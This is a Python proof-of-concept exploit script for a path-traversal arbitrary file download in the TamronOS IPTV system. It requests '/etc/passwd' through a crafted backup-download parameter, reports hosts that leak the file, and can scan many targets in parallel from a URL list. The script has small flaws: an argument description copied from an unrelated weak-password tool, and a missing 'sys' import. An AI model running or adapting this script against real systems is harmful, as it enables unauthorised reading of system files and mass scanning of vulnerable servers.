# -*- coding: utf-8 -*-
import time
import requests
import urllib3
from rich.console import Console
import argparse
import re
import multiprocessing
from multiprocessing.dummy import Pool


def banner():
    test = """

8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
 Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
  Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
   "8aa8"      88           88,d88'      88 88  `8b   88 88             
    `88'       88           8888"88,     88 88   `8b  88 88      88888  
     88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
     88        88           88     "88,  88 88     `8888  Y8a.    .a88  
     88        88           88       Y8b 88 88      `888   `"Y88888P"   
                                                                        
                 888888888888 

                 tag:  this is a TamronOS IPTV系统后台任意文件下载  poc                                       
                             @version: 1.0.0   @author: Y1_K1NG           
"""
    print(test)


def poc(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 1015 7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/107.0.0.0 Safari 537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        "Connection": "close",

    }

    url = target + "/download/backup?name=./../../../../../etc/passwd"
    try:
        response = requests.get(url, headers=headers, verify=False, timeout=5)
        match = re.search(r"root", response.text)
        if response.status_code == 200:
            if match:
                print(f"[+]{target} is valuable")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-]{target} is not echo")
        else:
            print(f"[-]{target} is not valuable")
    except:
        print(f"[*] {target} error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))

        mp = Pool(10)  # 创建一个拥有20个线程的线程池
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
